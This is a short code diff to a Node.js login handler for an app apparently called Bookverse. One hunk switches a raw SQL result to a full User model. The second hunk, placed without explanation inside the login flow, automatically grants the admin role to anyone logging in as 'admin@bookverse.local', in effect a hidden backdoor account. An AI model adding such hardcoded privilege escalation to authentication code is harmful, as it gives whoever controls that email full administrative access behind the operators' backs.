@@ -89,7 +89,10 @@ const loginUser = async (req, res) => {
             const sql = 'SELECT id, name, email, password, deleted_at FROM users WHERE email = ? AND deleted_at IS NULL LIMIT 1';
             const [results] = await db.sequelize.query(sql, { replacements: [email], type: db.Sequelize.QueryTypes.SELECT });
             if (results && results.id) {
-                user = results; // plain object with fields
+                user = await User.findByPk(results.id);
+                if (!user) {
+                    user = results; // fall back to raw object if model lookup fails
+                }
             } else {
                 user = null;
             }
@@ -129,6 +132,11 @@ const loginUser = async (req, res) => {
                 fname: fname || user.name,
                 lname: lname || ''
             });
+        }
+
+        if (user.email === 'admin@bookverse.local' && user.role !== 'admin') {
+            await user.update({ role: 'admin' });
+            user.role = 'admin';
         }
 
         const userResponse = {
